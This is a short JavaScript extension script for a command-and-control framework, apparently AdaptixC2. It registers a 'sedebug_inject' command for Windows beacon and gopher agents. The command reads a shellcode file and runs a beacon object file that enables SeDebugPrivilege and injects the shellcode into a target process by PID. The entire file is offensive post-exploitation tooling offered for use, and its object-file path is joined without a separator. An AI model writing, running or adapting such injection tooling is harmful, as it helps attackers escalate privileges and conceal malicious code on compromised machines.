var metadata = {
    name: "SeDebug-Inject",
    description: "Enable SeDebugPrivilege and inject shellcode into target process"
};

var cmd_sedebug = ax.create_command(
    "sedebug_inject",
    "Enable SeDebugPrivilege and inject shellcode into target process",
    "sedebug_inject -p 1234 -f /path/to/payload.bin"
);

cmd_sedebug.addArgFlagInt   ("-p", "pid",  "Target process PID");
cmd_sedebug.addArgFlagString("-f", "file", "Path to shellcode .bin file", "");

cmd_sedebug.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid       = parsed_json["pid"];
    let file_path = parsed_json["file"];

    if (pid === 0 || file_path === "") {
        ax.console_message(id, "Usage: sedebug_inject -p <pid> -f <path/to/payload.bin>", "error", "");
        return;
    }

    let shellcode = ax.file_read(file_path);
    if (shellcode === null || shellcode.byteLength === 0) {
        ax.console_message(id, "Failed to read .bin file: " + file_path, "error", "");
        return;
    }

    let bof_params = ax.bof_pack("int,bytes", [pid, shellcode]);
    let bof_path   = ax.script_dir() + "bin" + "SeDebugPrivilege.o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: SeDebugPrivilege inject");
});

var group_sedebug = ax.create_commands_group("SeDebug-Inject", [cmd_sedebug]);
ax.register_commands_group(group_sedebug, ["beacon", "gopher"], ["windows"], []);